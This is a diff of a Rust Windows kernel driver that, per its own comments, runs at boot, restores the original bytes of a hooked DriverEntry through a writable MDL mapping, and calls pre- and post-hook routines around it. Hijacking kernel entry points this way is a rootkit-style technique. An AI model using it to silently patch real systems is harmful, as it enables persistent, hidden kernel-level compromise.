@@ -10,49 +10,22 @@ mod logger;
 mod string;
 mod wrappers;
 
-use core::ffi::c_void;
-use core::{mem, ptr};
+use core::{mem, slice};
 
 use log::LevelFilter;
 use rat_common::kernel::KernelHandoff;
 use wdk_alloc::WdkAllocator;
-use wdk_sys::_LOCK_OPERATION::IoReadAccess;
-use wdk_sys::_MEMORY_CACHING_TYPE::MmCached;
-use wdk_sys::_MM_PAGE_PRIORITY::HighPagePriority;
-use wdk_sys::_MODE::KernelMode;
-use wdk_sys::ntddk::{
-    IoAllocateMdl, IoFreeMdl, MmMapLockedPagesSpecifyCache, MmProbeAndLockPages, MmUnlockPages,
-    MmUnmapLockedPages,
+use wdk_sys::{
+    NTSTATUS, PCUNICODE_STRING, PDRIVER_OBJECT, STATUS_INVALID_PARAMETER, STATUS_UNSUCCESSFUL,
 };
-use wdk_sys::{MDL, NTSTATUS, PCUNICODE_STRING, PDRIVER_OBJECT, STATUS_INVALID_PARAMETER};
+
+use crate::wrappers::mdl::MdlGuard;
 
 #[global_allocator]
 static GLOBAL_ALLOCATOR: WdkAllocator = WdkAllocator;
 
 type DriverEntryFn =
     unsafe extern "system" fn(driver: PDRIVER_OBJECT, registry_path: PCUNICODE_STRING) -> NTSTATUS;
-
-struct _MdlGuard {
-    pub mdl: *mut MDL,
-    pub mapped_address: *mut c_void,
-}
-
-impl Drop for _MdlGuard {
-    fn drop(&mut self) {
-        if !self.mapped_address.is_null() {
-            unsafe {
-                MmUnmapLockedPages(self.mapped_address, self.mdl);
-            }
-        }
-
-        if !self.mdl.is_null() {
-            unsafe {
-                MmUnlockPages(self.mdl);
-                IoFreeMdl(self.mdl)
-            }
-        }
-    }
-}
 
 /// # Safety
 /// This function is called by ntoskrnl during `KiSystemStartup`, following Windows x64 calling convention.
@@ -82,51 +55,24 @@ pub unsafe extern "system" fn driver_entry(
         && !extra.original_instructions.is_null()
         && extra.original_instructions_len > 0
     {
-        let mut guard = _MdlGuard {
-            mdl: ptr::null_mut(),
-            mapped_address: ptr::null_mut(),
-        };
-        unsafe {
-            guard.mdl = IoAllocateMdl(
-                extra.original_driver_entry as *mut c_void,
+        match unsafe {
+            MdlGuard::new(
+                extra.original_driver_entry.cast(),
                 extra.original_instructions_len as u32,
-                0,
-                0,
-                ptr::null_mut(),
-            );
-
-            if guard.mdl.is_null() {
-                error!("Failed to allocate MDL for original instructions");
-                return STATUS_INVALID_PARAMETER;
+            )
+        } {
+            Ok(mdl) => {
+                mdl.as_mut_slice().copy_from_slice(unsafe {
+                    slice::from_raw_parts(
+                        extra.original_instructions,
+                        extra.original_instructions_len,
+                    )
+                });
             }
-
-            let kernel_mode = KernelMode as i8;
-            let high_page_priority = HighPagePriority as u32;
-
-            // Lock pages in memory.
-            MmProbeAndLockPages(guard.mdl, kernel_mode, IoReadAccess);
-
-            // Map the locked pages to a new, writable virtual address.
-            guard.mapped_address = MmMapLockedPagesSpecifyCache(
-                guard.mdl,
-                kernel_mode,
-                MmCached,
-                ptr::null_mut(),
-                0,
-                high_page_priority,
-            );
-
-            if guard.mapped_address.is_null() {
-                error!("Failed to map locked pages for original instructions");
-                return STATUS_INVALID_PARAMETER;
+            Err(e) => {
+                error!("Unable to overwrite original instructions: {e}");
+                return STATUS_UNSUCCESSFUL;
             }
-
-            // Overwrite the original function bytes safely via the mapped writable address
-            ptr::copy_nonoverlapping(
-                extra.original_instructions,
-                guard.mapped_address.cast(),
-                extra.original_instructions_len,
-            );
         }
     } else {
         error!("Original instructions info is missing or invalid");
@@ -139,14 +85,14 @@ pub unsafe extern "system" fn driver_entry(
     };
 
     // Invoke our pre-hook logic
-    if let Err(e) = driver::driver_entry_prehook(driver, registry_path_ref) {
+    if let Err(e) = driver::driver_entry_prehook(driver, registry_path_ref, &extra) {
         error!("DriverEntry pre-hook error: {e}");
     }
 
     // Call the original DriverEntry
     info!(
         "Calling original DriverEntry at {:p}...",
-        extra.original_driver_entry
+        extra.original_driver_entry,
     );
     let status = unsafe {
         let original_fn = mem::transmute::<*mut u8, DriverEntryFn>(extra.original_driver_entry);
@@ -154,7 +100,7 @@ pub unsafe extern "system" fn driver_entry(
     };
 
     // Invoke our post-hook logic
-    if let Err(e) = driver::driver_entry_posthook(driver, registry_path_ref, status) {
+    if let Err(e) = driver::driver_entry_posthook(driver, registry_path_ref, status, &extra) {
         error!("DriverEntry post-hook error: {e}");
     }
     status
